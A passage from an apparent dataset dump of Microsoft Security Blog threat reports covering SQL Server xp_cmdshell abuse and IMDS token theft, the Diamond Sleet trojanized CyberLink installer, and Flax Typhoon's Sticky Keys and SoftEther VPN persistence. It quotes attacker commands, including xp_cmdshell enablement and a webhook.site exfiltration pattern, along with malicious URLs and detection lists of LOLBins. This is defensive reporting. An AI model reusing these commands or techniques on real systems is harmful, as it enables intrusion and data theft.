Database version - Network configuration - Readwritedelete permissions We assess that it is likely that the application targeted with the SQL injection vulnerability had elevated permissions, thus granting the attackers a similar level of access.\nThe attackers used this elevated permission to turn on the xp_cmdshell command, a method to launch operating system (OS) commands through a SQL query.\nSince xp_cmdshell is turned off by default to prevent exploitation, the attackers used the permissions they acquired to change the SQL configuration and ran the following commands to turn on xp_cmdshell: - “EXEC master..sp_configure ‘SHOW advanced options’,1; “RECONFIGURE WITH OVERRIDE;” - “EXEC master..sp_configure ‘xp_cmdshell’, 1; RECONFIGURE WITH OVERRIDE;” - “EXEC master..sp_configure ‘SHOW advanced options’,0; RECONFIGURE WITH OVERRIDE;” After enabling xp_cmdshell, the attackers manually initiated a series of operating system commands to launch the next phases of the attack.\nBy using xp_cmdshell, the attackers were able to operate as if they had a shell on the host.\nTo collect data, the attackers used simple methods such as reading directories, listing processes, and checking network shares.\nThe attackers downloaded several executables and PowerShell scripts that are encoded and compressed.\nMost of the attacker’s actions from this point were through PowerShell commands, scripts, and modules.\nFor persistence, the attackers used a scheduled task to launch a backdoor script.\nIn addition, the attackers tried to get credentials by dumping SAM and SECURITY registry keys.\nThe attackers used a unique method for data exfiltration: they utilized a publicly accessible service called “webhook.site”.\nThis service functions as a free platform for inspecting, debugging, and receiving incoming HTTP requests and emails.\nAny request directed to this address is promptly logged.\nThe commands are in this pattern: Command | Out-String ;Invoke-WebRequest -Uri https[:]//webhook.site/G-UID.\nUtilizing this method for data exfiltration allowed the attackers to operate discreetly when transmitting outgoing traffic, as the selected service can be considered as legitimate.\nWhile looking at the technique used by the attackers to perform lateral movement, we encountered a familiar method implemented in a distinct environment: the attackers tried utilizing the cloud identity of the SQL Server instance by accessing the IMDS and obtaining the cloud identity access key.\nThe IMDS is a RESTful web service that runs on a local IP address (169.254.169[.]254) and provides information about the VM, such as the VM’s region, tags, and the identity token.\nThe identity token is a JSON Web Token (JWT) that contains the claims and the signature of the identity.\nThe request to IMDS identity’s endpoint returns the security credentials (identity token) for the cloud identity.\nFor example, in Azure this request would look like: hxxp://169.254.169[.]254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ With the identity token, the attackers can perform various operations on cloud resources that the cloud identity has access to.\nThey can perform lateral movement across the cloud environment, thus getting access to external services.\nWhile the attackers in this case were unsuccessful in attempts to take advantage of this technique due to an error, we strongly recommend defenders to apply the best practices we provide in this blog post to protect environments against attacks that may use the same technique.\nConclusion To summarize, this attack demonstrates the attempt to leverage cloud identities in a SQL Server instance for lateral movement.\nThis is a technique we are familiar with in other cloud services such as VMs and Kubernetes cluster but haven’t seen before in SQL Server instances.\nWe have observed numerous attacks attempting to leverage cloud identities in Kubernetes and are aware of the potential risks and impact that can result from unauthorized access to their identity tokens.\nSimilarly, in SQL Server, cloud identities are also commonly employed and might possess elevated permissions to carry out actions in the cloud.\nNot properly securing cloud identities can expose SQL Server instances and cloud resources to similar risks.\nThis method provides an opportunity for the attackers to achieve greater impact not only on the SQL Server instances but also on the associated cloud resources.\nWith the increasing adoption of cloud technology, attackers and threat actors are utilizing known attack techniques in new environments and are becoming more sophisticated.\nThis evolving landscape of cloud-based attack techniques, with lateral movement being one of them, emphasizes the need for organizations to ensure strong defenses and safeguarding of critical assets in the cloud.\nThis attack also highlights the importance of least privilege practices when designing and deploying cloud-based and on-premises solutions.\nAttackers are often able to conduct further malicious activities through abusing over-privileged processes, accounts, managed identities, and database connections.\nIn this case, organizations are recommended to ensure that all applications are updated and secured and are given only the necessary permissions and privileges, to avoid putting connected SQL Server instances, as well as other cloud resources, at risk.\nDetection Microsoft Defender for Cloud The Microsoft Defender for Cloud helps to discover and mitigate potential database vulnerabilities and detects anomalous activities that may be an indication of a threat to SQL databases, SQL Servers on machines, open-source databases, and Azure Cosmos DB through Microsoft Defender for SQL.\nThe following Defender for SQL alerts might indicate threat activity like the threat described in this blog post: - Potential SQL injection - A possible vulnerability to SQL Injection - SQL Server potentially spawned a Windows command shell and accessed an abnormal external source As a cloud-based next-generation database protection solution, Defender for SQL is continuously updated with new detection capabilities and can now detect IMDS calls from SQL Server instances, the technique described in this article.\nMicrosoft Defender for Cloud also features Microsoft Defender for Resource Manager that analyzes Azure control plane operations to find abnormal behavior of cloud identities.\nThis coverage can help find lateral movement activities in your cloud environment.\nMicrosoft Defender for Endpoint The following Microsoft Defender for Endpoint alerts might indicate threat activity related to this threat, specifically the use of the xp_cmdshell command.\nNote, however, that these alerts can also be triggered by unrelated threat activity. -\nSQL Server login using xp_cmdshell - Suspicious SQLCMD activity Mitigation The vulnerability assessment solution in Defender for SQL can also detect vulnerabilities and misconfigurations in the database.\nMitigating and responding to vulnerabilities reduces the attack surface of the SQL Server and can prevent potential attacks.\nOne of the SQL vulnerability assessment rules involves the enablement of xp_cmdshell, providing a means to identify database instances where this setting is enabled.\nWith this coverage of the wide aspects of lateral movement in the cloud, and the correlations between them, organizations can strengthen their defenses and safeguard their critical assets from the risk of lateral movement.\nWe also recommend following security best practices for managed identities to prevent lateral movement in the cloud.\nBy implementing those security measures and adhering to the least privilege principle when granting permissions to managed identities, organizations can reduce the attack surface of those identities.\nHunting queries Microsoft 365 Defender Microsoft 365 Defender is becoming Microsoft Defender XDR.\nLearn more.\nMicrosoft 365 Defender customers can run the following query to find related activity in their networks: SQL Server abuse SQL Server offers a vast array of tools for automating tasks, exporting data, and running scripts.\nThese legitimate tools can be repurposed by attackers.\nBecause there are so many powerful commands an attacker might exploit, hunting for malicious activity involving SQL Server can be complicated.\nThis query detects instances of a SQL Server process launching a shell to run one or more suspicious commands.\nlet relevantCmdlineTokens = pack_array (\"advpack.dll\",\"appvlp.exe\",\"atbroker.exe\",\"bash.exe\",\"bginfo.exe\",\"bitsadmin.exe\",\"cdb.exe\",\"certutil.exe\",\"cl_invocation.ps1\",\"cl_mutexverifiers.ps1\",\"cmstp.exe\",\"Copy-Item\",\"csi.exe\",\"diskshadow.exe\",\"dnscmd.exe\",\"dnx.exe\",\"dxcap.exe\",\"esentutl.exe\",\"expand.exe\",\"extexport.exe\",\"extrac32.exe\",\"findstr.exe\",\"forfiles.exe\",\"ftp.exe\",\"gpscript.exe\",\"hh.exe\",\"ie4uinit.exe\",\"ieadvpack.dll\",\"ieaframe.dll\",\"ieexec.exe\",\"infdefaultinstall.exe\", \"installutil.exe\",\"Invoke-WebRequest\",\"makecab.exe\",\"manage-bde.wsf\",\"mavinject.exe\",\"mftrace.exe\",\"microsoft.workflow.compiler.exe\",\"mmc.exe\",\"msbuild.exe\",\"msconfig.exe\",\"msdeploy.exe\",\"msdt.exe\",\"mshta.exe\",\"mshtml.dll\",\"msiexec.exe\",\"msxsl.exe\",\"netstat\",\"odbcconf.exe\",\"pcalua.exe\",\"pcwrun.exe\",\"pcwutl.dll\",\"pester.bat\",\"ping\",\"presentationhost.exe\",\"pubprn.vbs\",\"rcsi.exe\",\"regasm.exe\",\"register-cimprovider.exe\",\"regsvcs.exe\",\"regsvr32.exe\",\"replace.exe\",\"rundll32.exe\",\"runonce.exe\",\"runscripthelper.exe\",\"schtasks.exe\",\"scriptrunner.exe\",\"setupapi.dll\",\"shdocvw.dll\",\"shell32.dll\",\"slmgr.vbs\",\"sqltoolsps.exe\",\"syncappvpublishingserver.exe\",\"syncappvpublishingserver.vbs\",\"sysinfo\",\"syssetup.dll\",\"systeminfo\",\"taskkill\",\"te.exe\",\"tracker.exe\",\"url.dll\",\"verclsid.exe\",\"vsjitdebugger.exe\",\"wab.exe\",\"WebClient\",\"wget\",\"whoami\",\"winrm.vbs\",\"wmic.exe\",\"xwizard.exe\",\"zipfldr.dll\",\"certutil\"); DeviceProcessEvents | where Timestamp >= ago(10d) | where InitiatingProcessFileName in~ (\"sqlservr.exe\", \"sqlagent.exe\", \"sqlps.exe\", \"launchpad.exe\") | summarize DistinctProcessCommandLines = tostring(makeset(ProcessCommandLine)) by DeviceId, bin(Timestamp, 2m) | where DistinctProcessCommandLines has_any(relevantCmdlineTokens) Microsoft Sentinel Microsoft Sentinel customers can deploy the Azure SQL solution that allows security analysts and administrators to rapidly deploy a range of detection and hunting queries to their Microsoft Sentinel environment.\nFor instance, the solution’s analytical rules assist in pinpointing unique SQL queries that attempt or succeed in executing commands – such as attempts to execute shell commands, suggestive of potential security risks.\nAdditionally, the hunting queries will highlight instances where potentially risky stored procedures like xp_cmdshell are called upon.\nMicrosoft Sentinel has a range of detection and threat hunting content that customers can use to detect the activity detailed in this blog: If the Azure SQL Solution is not currently deployed, Microsoft Sentinel customers can install the solution from the Content Hub to have the rules deployed in their Sentinel workspace.\nMore details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy.\nSunders Bruskin, Hagai Ran Kestenberg, Fady Nasereldeen, Cloud researchers in Microsoft Threat Intelligence team Further reading For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on Twitter at https://twitter.com/MsftSecIntel.","num_sentences":81,"metadata":{"source":"blog","platform":"Microsoft","filename":"defending-new-vectors"}}
{"id":57,"title":"Diamond Sleet supply chain compromise distributes a modified CyberLink installer | Microsoft Security Blog","publish_date":null,"link":"https://www.microsoft.com/en-us/security/blog/2023/11/22/diamond-sleet-supply-chain-compromise-distributes-a-modified-cyberlink-installer/","clean_text":"Microsoft Threat Intelligence has uncovered a supply chain attack by the North Korea-based threat actor Diamond Sleet (ZINC) involving a malicious variant of an application developed by CyberLink Corp., a software company that develops multimedia software products.\nThis malicious file is a legitimate CyberLink application installer that has been modified to include malicious code that downloads, decrypts, and loads a second-stage payload.\nThe file, which was signed using a valid certificate issued to CyberLink Corp., is hosted on legitimate update infrastructure owned by CyberLink and includes checks to limit the time window for execution and evade detection by security products.\nThus far, the malicious activity has impacted over 100 devices in multiple countries, including Japan, Taiwan, Canada, and the United States.\nMicrosoft attributes this activity with high confidence to Diamond Sleet, a North Korean threat actor.\nThe second-stage payload observed in this campaign communicates with infrastructure that has been previously compromised by Diamond Sleet.\nMore recently, Microsoft has observed Diamond Sleet utilizing trojanized open-source and proprietary software to target organizations in information technology, defense, and media.\nTo address the potential risk of further attacks against our customers, Microsoft has taken the following steps to protect customers in response to this malicious activity: - Microsoft has communicated this supply chain compromise to CyberLink - Microsoft is notifying Microsoft Defender for Endpoint customers that have been targeted or compromised in this campaign - Microsoft reported the attack to GitHub, which removed the second-stage payload in accordance with its Acceptable Use Policies - Microsoft has added the CyberLink Corp. certificate used to sign the malicious file to its disallowed certificate list - Microsoft Defender for Endpoint detects this activity as Diamond Sleet activity group. -\nMicrosoft Defender Antivirus detects the malware as Trojan:Win32/LambLoad.\nMicrosoft may update this blog as additional insight is gained into the tactics, techniques, and procedures (TTPs) used by the threat actor in this active and ongoing campaign.\nWho is Diamond Sleet?\nThe actor that Microsoft tracks as Diamond Sleet (formerly ZINC) is a North Korea-based activity group known to target media, defense, and information technology (IT) industries globally.\nDiamond Sleet focuses on espionage, theft of personal and corporate data, financial gain, and corporate network destruction.\nDiamond Sleet is known to use a variety of custom malware that is exclusive to the group.\nRecent Diamond Sleet malware is described in Microsoft’s reporting of the group’s weaponization of open source software and exploitation of N-day vulnerabilities.\nDiamond Sleet overlaps with activity tracked by other security companies as Temp.\nHermit and Labyrinth Chollima.\nActivity overview Microsoft has observed suspicious activity associated with the modified CyberLink installer file as early as October 20, 2023.\nThe malicious file has been seen on over 100 devices in multiple countries, including Japan, Taiwan, Canada, and the United States.\nWhile Microsoft has not yet identified hands-on-keyboard activity carried out after compromise via this malware, the group has historically: - Exfiltrated sensitive data from victim environments - Compromised software build environments - Moved downstream to additional victims for further exploitation - Used techniques to establish persistent access to victim environments Diamond Sleet utilized a legitimate code signing certificate issued to CyberLink Corp. to sign the malicious executable.\nThis certificate has been added to Microsoft’s disallowed certificate list to protect customers from future malicious use of the certificate: Signer: CyberLink Corp. Issuer: DigiCert SHA2 Assured ID Code Signing CA SignerHash: 8aa3877ab68ba56dabc2f2802e813dc36678aef4 CertificateSerialNumber: 0a08d3601636378f0a7d64fd09e4a13b Microsoft currently tracks the malicious application and associated payloads as LambLoad.\nLambLoad LambLoad is a weaponized downloader and loader containing malicious code added to a legitimate CyberLink application.\nThe primary LambLoad loader/downloader sample Microsoft identified has the SHA-256 hash 166d1a6ddcde4e859a89c2c825cd3c8c953a86bfa92b343de7e5bfbfb5afb8be.\nBefore launching any malicious code, the LambLoad executable ensures that the date and time of the local host align with a preconfigured execution period.\nThe loader then targets environments that are not using security software affiliated with FireEye, CrowdStrike, or Tanium by checking for the following process names: - csfalconservice.exe (CrowdStrike Falcon) - xagt.exe (FireEye agent) - taniumclient.exe (Tanium EDR solution) If these criteria are not met, the executable continues running the CyberLink software and abandons further execution of malicious code.\nOtherwise, the software attempts to contact one of three URLs to download the second-stage payload embedded inside a file masquerading as a PNG file using the static User-Agent ‘Microsoft Internet Explorer’: - hxxps[:]//i.stack.imgur[.]com/NDTUM.png - hxxps[:]//www.webville[.]net/images/CL202966126.png - hxxps[:]//cldownloader.github[.]io/logo.png The PNG file contains an embedded payload inside a fake outer PNG header that is, carved, decrypted, and launched in memory.\nWhen invoked, the in-memory executable attempts to contact the following callbacks for further instruction.\nBoth domains are legitimate but have been compromised by Diamond Sleet: - hxxps[:]//mantis.jancom[.]pl/bluemantis/image/addon/addin.php - hxxps[:]//zeduzeventos.busqueabuse[.]com/wp-admin/js/widgets/sub/wids.php The crypted contents of the PNG file (SHA-256: 089573b3a1167f387dcdad5e014a5132e998b2c89bff29bcf8b06dd497d4e63d) may be manually carved using the following command: To restore the in-memory payload statically for independent analysis, the following Python script can be used to decrypt the carved contents.\nTo crypt and verify: Both the fake PNG and decrypted PE payload have been made available on VirusTotal.\nRecommendations Microsoft recommends the following mitigations to reduce the impact of this threat.\nCheck the recommendations card for the deployment status of monitored mitigations. -\nUse Microsoft Defender Antivirus to protect from this threat.\nTurn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus.\nThese capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. -\nEnable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet. -\nEnable investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume. -\nTake immediate action to address malicious activity on the impacted device.\nIf malicious code has been launched, the attacker has likely taken complete control of the device.\nImmediately isolate the system and perform a reset of credentials and tokens. -\nInvestigate the device timeline for indications of lateral movement activities using one of the compromised accounts.\nCheck for additional tools that attackers might have dropped to enable credential access, lateral movement, and other attack activities.\nEnsure data integrity with hash codes. -\nTurn on the following attack surface reduction rule: Block executable files from running unless they meet a prevalence, age, or trusted list criterion.\nDetection details Microsoft Defender Antivirus Microsoft Defender Antivirus detects threat components as the following malware: - Trojan:Win32/LambLoad.\nA!dha - Trojan:Win32/LambLoad.\nB!dha - Trojan:Win32/LambLoad.\nC!dha - Trojan:Win64/LambLoad.\nD!dha - Trojan:Win64/LambLoad.\nE!dha Microsoft Defender for Endpoint Alerts with the following title in the security center can indicate threat activity on your network: - Diamond Sleet activity group The following alert might also indicate threat activity related to this threat.\nNote, however, that this alert can be also triggered by unrelated threat activity. -\nAn executable loaded an unexpected dll Threat intelligence reports Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog.\nThese reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.\nMicrosoft Defender Threat Intelligence Microsoft Defender XDR Threat analytics - Actor profile: Diamond Sleet - Activity profile: Diamond Sleet supply chain compromise at distributes a modified CyberLink installer Hunting queries Microsoft Defender XDR Microsoft Defender XDR (formerly Microsoft 365 Defender) customers can run the following query to find related activity in their networks: let iocs = dynamic([\"166d1a6ddcde4e859a89c2c825cd3c8c953a86bfa92b343de7e5bfbfb5afb8be\", \"089573b3a1167f387dcdad5e014a5132e998b2c89bff29bcf8b06dd497d4e63d\", \"915c2495e03ff7408f11a2a197f23344004c533ff87db4b807cc937f80c217a1\"]); DeviceFileEvents | where ActionType == \"FileCreated\" | where SHA256 in (iocs) | project Timestamp, DeviceName, FileName, FolderPath, SHA256 Microsoft Defender XDR and Microsoft Sentinel This query can be used in both Microsoft Defender XDR advanced hunting and Microsoft Sentinel Log Analytics.\nIt surfaces devices where the modified CyberLink installer can be found.\nDeviceFileCertificateInfo | where Signer contains \"CyberLink Corp\" | where CertificateSerialNumber == \"0a08d3601636378f0a7d64fd09e4a13b\" | where SignerHash == \"8aa3877ab68ba56dabc2f2802e813dc36678aef4\" | join DeviceFileEvents on SHA1 | distinct DeviceName, FileName, FolderPath, SHA1, SHA256, IsTrusted, IsRootSignerMicrosoft, SignerHash Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace.\nIf the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.\nThe following YAMLs contain queries that surface activities related to this attack: - Uncommon processes - Windows installer packages - Process entropy - Rare process path - Device network events with low-count FQDN Indicators of compromise The list below provides IOCs observed during our investigation.\nWe encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems.\n| Indicator | Type | Description | |---|---|---| | 166d1a6ddcde4e859a89c2c825cd3c8c953a86bfa92b343de7e5bfbfb5afb8be | SHA-256 | Trojanized CyberLink installer (LambLoad) | | 089573b3a1167f387dcdad5e014a5132e998b2c89bff29bcf8b06dd497d4e63d | SHA-256 | Second-stage PNG payload | | 915c2495e03ff7408f11a2a197f23344004c533ff87db4b807cc937f80c217a1 | SHA-256 | Decrypted PE from second-stage PNG | | hxxps[:]//update.cyberlink[.]com/Retail/Promeo/RDZCMSFY1ELY/CyberLink_Pr omeo_Downloader.exe | URL | CyberLink update URL used to deliver malicious installer | | hxxps[:]//update.cyberlink[.]com/Retail/Patch/Promeo/DL/RDZCMSFY1ELY/Cyb erLink_Promeo_Downloader.exe | URL | CyberLink update URL used to deliver malicious installer | | hxxps[:]//cldownloader.github[.]io/logo.png | URL | Stage 2 staging URL | | hxxps[:]//i.stack.imgur[.]com/NDTUM.png | URL | Stage 2 staging URL | | hxxps[:]//www.webville[.]net/images/CL202966126.png | URL | Stage 2 staging URL | | hxxps[:]//mantis.jancom[.]pl/bluemantis/image/addon/addin.php | URL | Stage 2 callback URL | | hxxps[:]//zeduzeventos.busqueabuse[.]com/wpadmin/js/widgets/sub/wids.php | URL | Stage 2 callback url | Further reading For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on X (formerly Twitter) at https://twitter.com/MsftSecIntel.","num_sentences":60,"metadata":{"source":"blog","platform":"Microsoft","filename":"diamond-sleet"}}
{"id":58,"title":"Flax Typhoon using legitimate software to quietly access Taiwanese organizations | Microsoft Security Blog","publish_date":null,"link":"https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/","clean_text":"Summary Microsoft has identified a nation-state activity group tracked as Flax Typhoon, based in China, that is targeting dozens of organizations in Taiwan with the likely intention of performing espionage.\nFlax Typhoon gains and maintains long-term access to Taiwanese organizations’ networks with minimal use of malware, relying on tools built into the operating system, along with some normally benign software to quietly remain in these networks.\nMicrosoft has not observed Flax Typhoon using this access to conduct additional actions.\nThis blog aims to raise awareness of the techniques used by this threat actor and inform better defenses to protect against future attacks.\nMicrosoft has observed a distinctive pattern of malicious activity almost exclusively affecting organizations in Taiwan using techniques that could be easily reused in other operations outside the region and would benefit from broader industry visibility.\nMicrosoft attributes this campaign to Flax Typhoon (overlaps with ETHEREAL PANDA), a nation-state actor based out of China.\nFlax Typhoon’s observed behavior suggests that the threat actor intends to perform espionage and maintain access to organizations across a broad range of industries for as long as possible.\nHowever, Microsoft has not observed Flax Typhoon act on final objectives in this campaign.\nMicrosoft is choosing to highlight this Flax Typhoon activity at this time because of our significant concern around the potential for further impact to our customers.\nAlthough our visibility into these threats has given us the ability to deploy detections to our customers, the lack of visibility into other parts of the actor’s activity compelled us to drive broader community awareness to further investigations and protections across the security ecosystem.\nIn this blog post, we share information on Flax Typhoon, the current campaign targeting Taiwan, and the actor’s tactics for achieving and maintaining unauthorized access to target networks.\nBecause this activity relies on valid accounts and living-off-the-land binaries (LOLBins), detecting and mitigating this attack could be challenging.\nCompromised accounts must be closed or changed.\nCompromised systems must be isolated and investigated.\nAt the end of this blog post, we share more mitigation steps and best practices, as well as provide details on how Microsoft 365 Defender detects malicious and suspicious activity to protect organizations from such stealthy attacks.\nWho is Flax Typhoon?\nFlax Typhoon has been active since mid-2021 and has targeted government agencies and education, critical manufacturing, and information technology organizations in Taiwan.\nSome victims have also been observed elsewhere in Southeast Asia, as well as in North America and Africa.\nFlax Typhoon focuses on persistence, lateral movement, and credential access.\nAs with any observed nation-state actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments.\nFlax Typhoon is known to use the China Chopper web shell, Metasploit, Juicy Potato privilege escalation tool, Mimikatz, and SoftEther virtual private network (VPN) client.\nHowever, Flax Typhoon primarily relies on living-off-the-land techniques and hands-on-keyboard activity.\nFlax Typhoon achieves initial access by exploiting known vulnerabilities in public-facing servers and deploying web shells like China Chopper.\nFollowing initial access, Flax Typhoon uses command-line tools to first establish persistent access over the remote desktop protocol, then deploy a VPN connection to actor-controlled network infrastructure, and finally collect credentials from compromised systems.\nFlax Typhoon further uses this VPN access to scan for vulnerabilities on targeted systems and organizations from the compromised systems.\nAnalysis of current campaign Initial access Flax Typhoon achieves initial access by exploiting known vulnerabilities in public-facing servers.\nThe services targeted vary, but include VPN, web, Java, and SQL applications.\nThe payload in these exploits is a web shell, such as China Chopper, which allows for remote code execution on the compromised server.\nPrivilege escalation In cases where the process compromised via web shell does not have local administrator privileges, Flax Typhoon downloads and runs a piece of malware that exploits one or more known vulnerabilities to obtain local system privileges.\nMicrosoft has observed the actor use Juicy Potato, BadPotato, and other open-source tools to exploit these vulnerabilities.\nPersistence Once Flax Typhoon can access Windows Management Instrumentation command-line (WMIC), PowerShell, or the Windows Terminal with local administrator privileges, the actor establishes a long-term method of accessing the compromised system using the remote desktop protocol (RDP).\nTo accomplish this, the actor disables network-level authentication (NLA) for RDP, replaces the Sticky Keys binary, and establishes a VPN connection.\nWhen using RDP, NLA requires the connecting user to authenticate to the remote system before a full remote session is established and the Windows sign-in screen is displayed.\nWhen NLA is disabled, any user attempting to access the remote system can interact with the Windows sign-in screen before authenticating, which can expose the remote system to malicious actions by the connecting user.\nFlax Typhoon changes a registry key to disable NLA, allowing them to access the Windows sign-in screen without authenticating, whereupon the actor will use the Sticky Keys shortcut.\nSticky Keys is an accessibility feature in Windows that allows users to press modifier keys (such as Shift, Ctrl, Alt) one at a time instead of simultaneously.\nIt includes a shortcut where the user can press the Shift key five times in succession to launch sethc.exe, the program that manages Sticky Keys.\nThe user can invoke this shortcut at any time, including at the sign-in screen.\nTo take advantage of this feature, Flax Typhoon changes a registry key that specifies the location of sethc.exe.\nThe actor adds arguments that cause the Windows Task Manager to be launched as a debugger for sethc.exe.\nAs a result, when the actor uses the Sticky Keys shortcut on the Windows sign-in screen, Task Manager launches with local system privileges.\nAt this stage, Flax Typhoon can access the compromised system via RDP, use the Sticky Keys shortcut at the sign-in screen, and access Task Manager with local system privileges.\nFrom there, the actor can launch the Terminal, create memory dumps, and take nearly any other action on the compromised system.\nThe only issue the actor faces with this persistence method is that RDP is most likely running on an internal-facing network interface.\nFlax Typhoon’s solution is to install a legitimate VPN bridge to automatically connect to actor-controlled network infrastructure.\nCommand and control To deploy the VPN connection, Flax Typhoon downloads an executable file for SoftEther VPN from their network infrastructure.\nThe actor downloads the tool using one of several LOLBins, such as the PowerShell Invoke-WebRequest utility, certutil, or bitsadmin.\nFlax Typhoon then uses the Service Control Manager (SCM) to create a Windows service that launches the VPN connection automatically when the system starts.\nThis could allow the actor to monitor the availability of the compromised system and establish an RDP connection.\nFlax Typhoon takes several precautions with their VPN connection to make it harder to identify.\nFirst, the actor uses a legitimate VPN application that could be found in enterprise environments.\nAs a result, the file itself is almost certain to go undetected by antivirus products.\nSecond, the actor almost always renames the executable file from vpnbridge.exe to conhost.exe or dllhost.exe.\nThese names imitate the legitimate Windows components Console Window Host Process and Component Object Model Surrogate respectively.\nThird, the actor uses SoftEther’s VPN-over-HTTPS operation mode, which uses protocol tunneling to encapsulate Ethernet packets into compliant HTTPS packets and transmit them to TCP port 443.\nThis makes the VPN connection very difficult to differentiate from legitimate HTTPS traffic, which most network security appliances would not block.\nIn cases where Flax Typhoon needs to move laterally to access other systems on the compromised network, the actor uses LOLBins, including Windows Remote Management (WinRM) and WMIC.\nMicrosoft has observed Flax Typhoon routing network traffic to other targeted systems through the SoftEther VPN bridge installed on compromised systems.\nThis network traffic includes network scanning, vulnerability scanning, and exploitation attempts.\nCredential access Once Flax Typhoon becomes established on the target system, Microsoft observes the actor conducting credential access activities using common tools and techniques.\nMost commonly, Flax Typhoon targets the Local Security Authority Subsystem Service (LSASS) process memory and Security Account Manager (SAM) registry hive.\nBoth stores contain hashed passwords for users signed into the local system.\nFlax Typhoon frequently deploys Mimikatz, a publicly available malware that can automatically dump these stores when improperly secured.\nThe resulting password hashes can be cracked offline or used in pass-the-hash (PtH) attacks to access other resources on the compromised network.\nFlax Typhoon also enumerates restore points used by System Restore.\nRestore points contain data about the Windows operating system that the system owner can use to revert changes to the system if it becomes inoperable, rather than a backup of user data.\nFlax Typhoon could use this information to better understand the compromised system or as a template for removing indicators of malicious activity.\nThis pattern of activity is unusual in that minimal activity occurs after the actor establishes persistence.\nFlax Typhoon’s discovery and credential access activities do not appear to enable further data-collection and exfiltration objectives.\nWhile the actor’s observed behavior suggests Flax Typhoon intents to perform espionage and maintain their network footholds, Microsoft has not observed Flax Typhoon act on final objectives in this campaign.\nMitigation and protection guidance Defending against techniques used by Flax Typhoon begins with vulnerability and patch management, particularly on systems and services exposed to the public internet.\nThe credential access techniques used can also be mitigated with proper system hardening.\nWhat to do now if you’re affected Affected organizations need to assess the scale of Flax Typhoon activity in their network, remove malicious tools and C2 infrastructure, and check logs for signs of compromised accounts that may have been used for malicious purposes.\nInvestigating Suspected compromised accounts or affected systems - Find LSASS and SAM dumping to identify affected accounts. -\nExamine the activity of compromised accounts for any malicious actions or exposed data. -\nClose or change credentials for all compromised accounts.\nDepending on the level of activity, many accounts may be affected. -\nAffected systems should be isolated and forensically examined for artifacts of malicious activity. -\nBecause Flax Typhoon alters the configuration of the operating system to produce malicious behavior, affected systems may need to be decommissioned or restored to a known-good configuration.\nDefending against Flax Typhoon attacks - Keep public-facing servers up to date to defend against malicious activity.\nAs prime targets for threat actors, public-facing servers need additional monitoring and security.\nUser input validation, file integrity monitoring, behavioral monitoring, and web application firewalls can all help to better secure these servers. -\nMonitor the Windows registry for unauthorized changes.\nThe Audit Registry feature allows administrators to generate events when specific registry keys are modified.\nSuch policies can detect registry changes that undermine the security of a system, like those made by Flax Typhoon. -\nUse network monitoring and intrusion detection systems to identify unusual or unauthorized network traffic.\nIf an organization does not use RDP for a specific business purpose, any RDP traffic should be considered unauthorized and generate alerts. -\nEnsure that Windows systems are kept updated with the latest security patches, including MS16-075. -\nMitigate the risk of compromised valid accounts by enforcing strong multifactor authentication (MFA) policies using hardware security keys or Microsoft Authenticator.\nPasswordless sign-in methods (for example, Windows Hello, FIDO2 security keys, or Microsoft Authenticator), password expiration rules, and deactivating unused accounts can also help mitigate risk from this access method. -\nRandomize Local Administrator passwords with a tool like Local Administrator Password Solution (LAPS) to prevent lateral movement using local accounts with shared passwords. -\nReduce the attack surface.\nMicrosoft customers can turn on the following attack surface reduction rules to block or audit some observed activity associated with this threat: - Block credential stealing from the Windows local security authority subsystem (lsass.exe). -\nBlock process creations originating from PSExec and WMI commands.\nSome organizations may experience compatibility issues with this rule on certain server systems but should deploy it to other systems to prevent lateral movement originating from PsExec and WMI. -\nHarden the LSASS process by enabling Protective Process Light (PPL) for LSASS on Windows 11 devices.\nNew, enterprise-joined Windows 11 (22H2 update) installs have this feature enabled by default.\nIn addition, enable Windows Defender Credential Guard, which is also turned on by default for organizations using the Enterprise edition of Windows 11, as well as Memory integrity (also referred to as hypervisor-protected code integrity or HVCI) for stronger protections on Windows. -\nSet the WDigest UseLogonCredential registry value via Group Policy Object to reduce the risk of successful LSASS process memory dumping. -\nTurn on cloud-delivered protection in Microsoft Defender Antivirus to cover rapidly evolving attacker tools, techniques, and behaviors such as those exhibited by Flax Typhoon. -\nRun endpoint detection and response (EDR) in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat, or when Microsoft Defender Antivirus is running in passive mode.\nEDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-compromise.\nDetection details and hunting queries Microsoft 365 Defender detections Microsoft 365 Defender is becoming Microsoft Defender XDR.\nLearn more.\nMicrosoft Defender Antivirus Microsoft Defender Antivirus detects threat components as the following malware: - HackTool:Win32/Mimikatz - Trojan:Win32/Swrort - HackTool:Win32/Badcastle - Behavior:Win32/CobaltStrike - Backdoor:ASP/Chopper Microsoft Defender for Endpoint The following alerts might indicate threat activity related to this threat.\nNote, however, that these alerts can also be triggered by unrelated threat activity. -\nMalicious credential theft tool execution detected - Suspicious access to LSASS service - Use of LOLBin to run malicious code - System file masquerade Hunting queries Microsoft 365 Defender Microsoft 365 Defender customers can run the following queries to find related activity in their networks: Network activity with Flax Typhoon network infrastructure let ipAddressTimes = datatable(ip: string, 